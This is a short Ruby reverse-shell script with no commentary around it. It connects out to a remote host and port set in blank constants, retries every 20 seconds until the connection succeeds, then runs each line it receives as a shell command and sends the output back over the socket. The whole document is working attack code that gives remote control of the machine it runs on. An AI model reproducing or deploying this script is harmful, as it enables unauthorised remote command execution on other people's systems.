#!usr/bin/env/ruby

require 'socket'
require 'open3'


RHOST = "" # Remote Host IP
RPORT = "" # Remote Host Port

begin
sock = TCPSocket.new "#{RHOST}", "#{RPORT}"
sock.puts "We are connected!!"
rescue
    sleep 20
    retry
end

begin
    while line = sock.gets
        Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
            IO.copy_stream(stdout_and_stderr, sock)
        end
    end
rescue
    retry
end

